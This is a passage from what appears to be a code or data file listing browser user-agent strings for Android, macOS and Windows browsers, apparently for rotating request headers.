    'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; TECNO CA8S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; MRD-LX1F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 EdgA/96.0.1054.53',
    'Mozilla/5.0 (Linux; Android 9; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G950N Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.33 Mobile Safari/537.36 NAVER(inapp; search; 1010; 11.17.3)',
    'Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; T5 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.1.75.00 SA/3 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11; en-us; RMX3231 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/7.5.9',
    'Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; Mi Note 2 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1079 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1081 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1145 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1146 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2410 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.114 Whale/3.17.145.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.24',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.28',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.149 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.158 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.5.710 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.61',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.72',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 08)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2419 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2424 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Viewer/97.9.5538.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.18 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4539.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.106.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36',
